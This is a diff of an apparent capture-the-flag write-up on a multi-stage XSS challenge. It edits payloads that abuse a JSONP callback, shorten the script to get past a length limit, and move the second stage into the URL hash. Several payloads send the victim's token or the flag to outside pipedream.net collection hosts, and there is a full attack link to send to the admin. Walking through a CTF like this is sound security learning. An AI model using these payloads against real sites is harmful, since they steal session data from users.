@@ -138,7 +138,7 @@ We can just defer our script to run after all the normal scripts using the `defe
 <script defer src="http://xss.allesctf.net/items.php?cb=let%20token%20%3D%20%24%28%22%23stage2%22%29.attr%28%22href%22%29.split%28%22%3D%22%29%5B1%5D%3B%0Alocation%20%3D%20%22%2F%2Fenbdblkpmmbod.x.pipedream.net%2F%22%20%2B%20token%3B"></script>
 ```
 
-If we now URL-encode that again, pass it to the search and send the link to the admin we will quickly see a request like this in [RequestBin](https://requestbin.com/):
+If we now URL-encode that again, pass it to the search and send the link to the admin we will quickly see a request like this in RequestBin:
 ```
 /5e73de0e6dd59
 ```
@@ -391,10 +391,8 @@ callback param is too long!
 Trying a few different callback lengths, we can easily find out that the callback can't be longer than `250` characters.
 
 Let's shorten our callback up a bit:
-```
-x=stage2.href;
-fetch(x,{method:"post",headers:{'Content-type':'multipart/form-data'},credentials:"include",body:`lang"><hr id=backgrounds lang="<script>location='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"><!--`});
-location=x;
+```javascript
+fetch(x=stage2.href,{method:"post",headers:{'Content-type':'multipart/form-data'},credentials:"include",body:`lang"><hr id=backgrounds lang="<script>location='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"><!--`});location=x;
 ```
 
 That should be less than `250` characters. But strangely, when we try it again, `items.php` still says it's too long.
@@ -415,32 +413,34 @@ Taking a closer look we can see that it replaces `<` and `>`.
 To avoid this we can just replace them with `\x3c` and `\x3e`. That's the hex representation of the characters.
 In a JavaScript string, this is the same as writing the characters out directly but `items.php`, of course, doesn't get that.
 
-The script is still shorter than `250` characters (`249` to be exact 😅) so everything should work now:
+The script is still shorter than `250` characters (`245` to be exact 😅) so everything should work now:
 ```javascript
-x=stage2.href;
-fetch(x,{method:"post",headers:{'Content-type':'multipart/form-data'},credentials:"include",body:`lang"\x3e\x3chr id=backgrounds lang="\x3cscript\x3elocation='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"\x3e\x3c!--`});
-location=x;
+fetch(x=stage2.href,{method:"post",headers:{'Content-type':'multipart/form-data'},credentials:"include",body:`lang"\x3e\x3chr id=backgrounds lang="\x3cscript\x3elocation='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"\x3e\x3c!--`});location=x;
 ```
 
 Actually, if we needed to, we could still make the script even shorter.
 
-Besides the obvious things, like removing the two newlines and getting a shorter domain,
-we can remove the `Content-type` header by passing an `URLSearchParams` object as the request body.
+We can just use `stage2` instead of `stage2.href` since it will automatically get converted correctly.
+
+We can also remove the `Content-type` header by passing an `URLSearchParams` object as the request body.
 
 This will automatically set the header to the same value but is quite a bit shorter.
 
-We are now at `226` characters and with a very short domain (like `abc.io`) we could even get down to just `203` characters:
+In addition we can even pass the request body via the hash in the url and retrieve it using `decodeURI(location.hash.slice(1))`.
+This way we also don't need to escape the `<` and `>` and in addition the length of the payload doesn't depend on the domain anymore.
+
+With this we are now at `130` characters:
 
 ```javascript
-x=stage2.href;fetch(x,{method:"post",credentials:"include",body:new URLSearchParams({bg:`lang"\x3e\x3chr id=backgrounds lang="\x3cscript\x3elocation='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"\x3e\x3c!--`})});location=x;
+fetch(x=stage2,{method:"post",credentials:"include",body:new URLSearchParams({bg:decodeURI(location.hash.slice(1))})});location=x;
 ```
 
-Ok, now let's URL-encode everything again, pass it to `items.php`, then to the search and send the link to the admin:
+Ok, now let's URL-encode everything again, pass it to `items.php`, then to the search, add the stage 2 payload as a hash and send the link to the admin:
 ```
-http://xss.allesctf.net/?search=%3Cscript%20defer%20src%3D%22%2Fitems.php%3Fcb%3Dx%253Dstage2.href%253Bfetch%2528x%252C%257Bmethod%253A%2522post%2522%252Ccredentials%253A%2522include%2522%252Cbody%253Anew%2520URLSearchParams%2528%257Bbg%253A%2560lang%2522%255Cx3e%255Cx3chr%2520id%253Dbackgrounds%2520lang%253D%2522%255Cx3cscript%255Cx3elocation%253D%2527%252F%252Fenbdblkpmmbod.x.pipedream.net%252F%2527%252B%2524%2528%2527b%2527%2529.text%2528%2529%2522%255Cx3e%255Cx3c%2521--%2560%257D%2529%257D%2529%253Blocation%253Dx%253B%22%3E%3C%2Fscript%3E
+http://xss.allesctf.net/?search=%3Cscript%20defer%20src%3D%22%2Fitems.php%3Fcb%3Dfetch%2528x%253Dstage2%252C%257Bmethod%253A%2522post%2522%252Ccredentials%253A%2522include%2522%252Cbody%253Anew%2520URLSearchParams%2528%257Bbg%253AdecodeURI%2528location.hash.slice%25281%2529%2529%257D%2529%257D%2529%253Blocation%253Dx%253B%22%3E%3C%2Fscript%3E#lang"><hr id=backgrounds lang="<script>location='//enua5wx7g1rp.x.pipedream.net/'+$('b').text()"><!--
 ```
 
-After a few seconds we will see a requests like this in [RequestBin](https://requestbin.com/):
+After a few seconds we will see a requests like this in RequestBin:
 ```
 /CSCG%7Bc0ngratZ_y0u_l3arnD_sUm_jS:%3E%7D
 ```
